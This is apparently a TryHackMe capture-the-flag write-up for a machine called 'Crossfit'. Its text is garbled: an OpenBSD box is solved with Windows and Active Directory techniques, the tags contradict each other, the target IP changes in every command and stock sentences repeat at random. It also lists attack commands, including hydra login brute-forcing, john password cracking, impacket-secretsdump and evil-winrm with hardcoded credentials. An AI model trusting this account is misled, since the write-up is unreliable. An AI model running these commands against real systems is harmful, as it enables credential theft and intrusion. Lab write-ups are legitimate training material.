---
TitleSEO: "TryHackMe — Crossfit (Easy OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Crossfit (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Crossfit. SeImpersonatePrivilege and DCSync to achieve easy compromise on OpenBSD."
Keywords: "ctf, forensics, easy, linux, insane, web, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-crossfit-523.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-crossfit-523/"
Date: "2026-01-12"
Tags: "CTF, Forensics, Easy, Linux, Insane, Web, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-crossfit-523"
Permalink: "/writeups/htb-crossfit-523.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Crossfit** is rated **Easy** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.14.1.141`.

### Objectives

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.52.106.172/FUZZ
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.124.90.212
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.63.76/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Web Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.59.61 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.53.14.19 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **SeImpersonatePrivilege**.

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.110.62 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.73.234.197 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.149.5 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.41.79.172/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.49.29.110/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.45.85.210 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.126.131.153/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.151.171/FUZZ
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `burpsuite`
- `gobuster`
- `kerbrute`
- `wmiexec`
- `smbclient`
- `rpcclient`
- `sqlmap`

### Key Takeaways

- SeImpersonatePrivilege
- DCSync
- AS-REP Roasting
